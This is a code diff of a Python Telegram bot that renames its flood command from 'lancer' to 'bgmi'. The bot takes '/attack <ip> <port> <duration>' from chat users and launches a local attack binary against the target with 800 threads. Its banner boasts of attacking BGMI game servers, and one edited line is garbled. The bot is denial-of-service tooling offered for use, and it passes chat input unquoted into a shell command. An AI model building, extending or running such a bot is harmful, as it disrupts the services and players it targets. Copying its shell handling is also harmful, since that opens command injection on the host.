@@ -24,7 +24,7 @@ users = load_users()
 async def start(update: Update, context: CallbackContext):
     chat_id = update.effective_chat.id
     message = (
-        "*🇮🇳 𓆩𝐋𝐀𝐍𝐂𝐄𝐑𓆪 🇮🇳*\n\n"
+        "*🇮🇳 𓆩bgmi�𓆪 🇮🇳*\n\n"
         "*🐰 𝐔𝐬𝐞 /attack <𝐢𝐩> <𝐩𝐨𝐫𝐭> <𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧> 🐰*\n\n"
         "*🔥 𝐑𝐄𝐀𝐃𝐘 𝐓𝐎 𝐅𝐔𝐂𝐊 𝐁𝐆𝐌𝐈 🔥*"
     )
@@ -60,7 +60,7 @@ async def run_attack(chat_id, ip, port, duration, context):
 
     try:
         process = await asyncio.create_subprocess_shell(
-            f"./lancer {ip} {port} {duration} 800",
+            f"./bgmi {ip} {port} {duration} 800",
             stdout=asyncio.subprocess.PIPE,
             stderr=asyncio.subprocess.PIPE
         )
@@ -94,7 +94,7 @@ async def attack(update: Update, context: CallbackContext):
         return
 
     if len(args) != 3:
-        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝐔𝐬𝐚𝐠𝐞: /lancer <𝐢𝐩> <𝐩𝐨𝐫𝐭> <𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧>*", parse_mode='Markdown')
+        await context.bot.send_message(chat_id=chat_id, text="*✅ 𝐔𝐬𝐚𝐠𝐞: /bgmi <𝐢𝐩> <𝐩𝐨𝐫𝐭> <𝐝𝐮𝐫𝐚𝐭𝐢𝐨𝐧>*", parse_mode='Markdown')
         return
 
     ip, port, duration = args
